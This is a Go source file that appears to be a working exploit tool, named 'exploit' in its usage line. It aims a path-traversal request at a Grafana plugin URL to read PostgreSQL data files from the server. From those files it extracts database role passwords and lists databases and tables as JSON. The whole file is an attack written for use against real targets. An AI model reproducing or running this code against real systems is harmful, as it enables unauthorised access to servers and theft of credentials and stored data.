package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

type Result struct {
	Credentials []string            `json:"credentials"`
	Databases   map[string][]string `json:"databases"`
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: exploit <grafana-url>")
		os.Exit(1)
	}

	read := pathTraversalReader(os.Args[1], "/var/lib/postgresql/data")
	result := Result{Databases: make(map[string][]string)}

	if passwords, err := pgdump.ExtractPasswordsFromFiles(read); err == nil {
		for _, p := range passwords {
			if p.Password != "" {
				result.Credentials = append(result.Credentials, p.RoleName+":"+p.Password)
			}
		}
	}

	if dbData, err := read(fmt.Sprintf("global/%d", pgdump.PGDatabase)); err == nil {
		for _, db := range pgdump.ParsePGDatabase(dbData) {
			if strings.HasPrefix(db.Name, "template") {
				continue
			}
			base := fmt.Sprintf("base/%d", db.OID)
			classData, _ := read(base + fmt.Sprintf("/%d", pgdump.PGClass))
			attrData, _ := read(base + fmt.Sprintf("/%d", pgdump.PGAttribute))
			if dump, _ := pgdump.DumpDatabaseFromFiles(classData, attrData, func(fn uint32) ([]byte, error) {
				return read(fmt.Sprintf("%s/%d", base, fn))
			}, nil); dump != nil {
				for _, t := range dump.Tables {
					result.Databases[db.Name] = append(result.Databases[db.Name], fmt.Sprintf("%s (%d rows)", t.Name, len(t.Rows)))
				}
			}
		}
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(result)
}

func pathTraversalReader(target, pgdata string) func(string) ([]byte, error) {
	return func(path string) ([]byte, error) {
		url := strings.TrimSuffix(target, "/") + "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f.." + pgdata + "/" + path
		resp, err := http.Get(url)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		return io.ReadAll(resp.Body)
	}
}
